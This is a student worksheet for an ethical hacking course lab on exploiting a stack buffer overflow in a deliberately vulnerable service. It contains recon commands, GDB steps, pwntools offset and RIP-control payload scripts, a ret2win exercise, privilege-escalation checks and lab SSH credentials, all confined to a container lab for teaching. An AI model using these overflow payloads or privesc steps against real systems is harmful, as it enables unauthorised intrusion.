# Week 10: Exploit Development
## CYB204 Ethical Hacking — Student Worksheet

---

## Before We Start (5 minutes)

### Important Rules
✅ **DO:** Only exploit targets within this lab environment
✅ **DO:** Read the source code in `/root/tools/vuln.c` — understanding the bug is part of the exercise
✅ **DO:** Save every GDB output and working payload — you'll need this for Assessment 2
❌ **DON'T:** Attempt buffer overflow attacks on any real system without authorisation
❌ **DON'T:** Skip the recon phase — this worksheet simulates a real engagement

### Connection to Assessment 2
Assessment 2 is a 3000-word practical pentest report. This lab generates the raw findings you need: recon output, vulnerability discovery, exploit development notes, and post-exploitation evidence.

---

## Setup (5 minutes)

```bash
# Start the lab (allow ~60 seconds for compilation)
make run-week10

# Enter attacker container
docker exec -it week10-attacker bash

# Verify targets
ping -c 1 172.100.0.10 && echo "web-recon: UP" || echo "web-recon: DOWN"
ping -c 1 172.100.0.11 && echo "vuln-target: UP" || echo "vuln-target: DOWN"
```

---

## Phase 1: Reconnaissance (15 minutes)

### Exercise 1.1: Port Scan

```bash
# Comprehensive scan of the target
nmap -sV -sC -A 172.100.0.0/24 -oA /tmp/week10-recon
```

**Fill in the discovery table:**

| Host | Port | Service | Version |
|------|------|---------|---------|
| 172.100.0.10 | | | |
| 172.100.0.11 | 22 | | |
| 172.100.0.11 | 9999 | | |

---

### Exercise 1.2: Web Recon

```bash
# Fetch the web page
curl http://172.100.0.10

# Enumerate directories
gobuster dir -u http://172.100.0.10 -w /usr/share/wordlists/dirb/common.txt
```

**What clues did the web page give about the target?**

_________________________________

---

### Exercise 1.3: Connect to the Debug Service

```bash
# Probe the debug service manually
nc 172.100.0.11 9999
```

Type a short name and press Enter.

**What does the service print at startup (two lines)?**

_________________________________

**What is the address of `secret_function()` printed by the service?**

`secret_function() is at: ___________________`

**Note:** Write this address down carefully — you will use it in Phase 3.

---

## Phase 2: Vulnerability Analysis (25 minutes)

### Exercise 2.1: Read the Source Code

```bash
cat /root/tools/vuln.c
```

Find the `handle_client()` function and answer:

**How large is `buf`?** _____ bytes

**How many bytes does `read()` accept into `buf`?** _____ bytes

**What is this vulnerability called?** _________________________________

---

### Exercise 2.2: Confirm the Overflow with GDB

SSH into the target to run GDB locally (gives a cleaner debugging experience):

```bash
# SSH credentials: lowpriv / lowpriv123
ssh lowpriv@172.100.0.11

# On the target machine:
gdb /opt/vuln
```

Inside GDB:

```gdb
# Disassemble the vulnerable function
disas handle_client

# Note the addresses of the buffer and return address
info frame
```

**What is the address of `buf` on the stack?** `________________`

**What is the saved return address (`rip`)?** `________________`

---

### Exercise 2.3: Crash the Service

From your attacker machine (in a different terminal):

```bash
docker exec -it week10-attacker bash
python3 -c "print('A' * 200)" | nc 172.100.0.11 9999
```

**Did the service crash?**  ✓ Yes  ✓ No

In GDB, set a breakpoint and catch the crash:

```gdb
run
# (after crash) info registers
# Look at rip — is it 0x4141414141414141?
```

**What value is in `rip` after the crash?** `________________`

---

## Phase 3: Exploit Development (30 minutes)

### Exercise 3.1: Find the Exact Offset

Use pwntools to generate a cyclic pattern (de Bruijn sequence):

```bash
python3 -c "from pwn import *; print(cyclic(200).decode())" | nc 172.100.0.11 9999
```

In GDB, the crash value in `rip` (or the segfault address) tells you the exact offset:

```python
python3 -c "from pwn import *; print(cyclic_find(0x<VALUE_FROM_RIP>))"
```

**Exact offset to return address:** _____ bytes

---

### Exercise 3.2: Verify RIP Control

```bash
# Send exactly <offset> A's + 8 B's — if RIP = 0x4242424242424242, you control it
python3 -c "
from pwn import *
offset = <YOUR_OFFSET>
payload = b'A' * offset + b'B' * 8 + b'\n'
p = remote('172.100.0.11', 9999)
p.recvuntil(b': ')
p.send(payload)
p.close()
"
```

**What is in RIP after sending this payload?** `________________`

**Does this confirm RIP control?**  ✓ Yes  ✓ No

---

### Exercise 3.3: ret2win — Jump to secret_function()

The service prints the address of `secret_function()` on startup (you wrote it down in Exercise 1.3). Now redirect execution there:

```bash
python3 /root/tools/exploit_template.py
```

Edit the template's `step3_control_eip()` call with your offset and the `secret_function` address:

```python
# In exploit_template.py, uncomment and fill in:
step3_control_eip(offset=<YOUR_OFFSET>, target_addr=<SECRET_FUNCTION_ADDR>)
```

**Did you get a shell?**  ✓ Yes  ✓ No

**What did `secret_function()` print?**

_________________________________

---

## Phase 4: Privilege Escalation (15 minutes)

If you got a shell from `secret_function()`, it runs as the service user. Now escalate.

### Exercise 4.1: Check Your Current Privileges

```bash
id
whoami
sudo -l
```

**What user are you running as?** _________________________________

**Can you run anything as sudo?** _________________________________

---

### Exercise 4.2: Common Privesc Checks

```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Check /etc/passwd for interesting users
cat /etc/passwd | grep -v nologin
```

**Note any interesting SUID binaries:**

_________________________________

---

## Phase 5: Reporting Notes (15 minutes)

### Exercise 5.1: Write a Vulnerability Summary

Complete this for your Assessment 2 report:

**Vulnerability:** _________________________________

**Affected Component:** vuln.c `handle_client()`, line ___

**CVSS Score (estimate):** ___  **Severity:** Critical / High / Medium / Low

**Description:**

_________________________________

**Proof of Concept (one sentence):**

_________________________________

**Remediation:**

_________________________________

---

### Exercise 5.2: Compile Protections Analysis

The service was compiled with protections disabled. Fill in what each protection does and why it mattered here:

| Protection | Flag | Effect if ENABLED | Was it enabled? |
|------------|------|-------------------|-----------------|
| Stack canary | `-fstack-protector` | | No |
| PIE | `-pie` | | No |
| Executable stack | `-z noexecstack` | | No |
| ASLR | OS-level | | No (container) |

---

## Quick Knowledge Check

1. What is a stack buffer overflow?
   - A) Overwriting heap memory  B) Writing past the end of a stack buffer, overwriting saved return address  C) Integer overflow  D) Format string attack

2. What does the `-fno-stack-protector` gcc flag do?
   - A) Enables ASLR  B) Disables stack canary  C) Removes PIE  D) Enables NX

3. What is a "ret2win" exploit?
   - A) Injecting shellcode  B) Redirecting execution to an existing function in the binary  C) Return-oriented programming  D) Heap spray

4. True/False: ASLR alone completely prevents buffer overflow exploitation.

5. What pwntools function generates a de Bruijn sequence for offset finding?
   - A) `cyclic()`  B) `pattern_create()`  C) `offset_find()`  D) `bruijn()`

---

## Cleanup

```bash
exit  # exit attacker container
cd labs/week10 && docker compose down
```

---

## Assessment 2 Checklist

After completing this lab, you should have notes covering:

- [ ] Recon: Nmap scan output with services and versions
- [ ] Enumeration: What the web page and debug service revealed
- [ ] Vulnerability: Exact bug (function, line, type)
- [ ] Exploit: Offset, target address, working payload
- [ ] Post-exploitation: User context, privilege escalation attempted
- [ ] Remediation: Compiler flags, input validation, ASLR/canaries

---

## Summary

Today you learned to:
✓ Perform full-chain recon → enum → exploit on a target
✓ Identify a stack buffer overflow from source code
✓ Use GDB and pwntools to find crash offsets and control RIP
✓ Execute a ret2win exploit without shellcode injection
✓ Structure findings for a professional pentest report

**Instructor Contact:** _________________________________
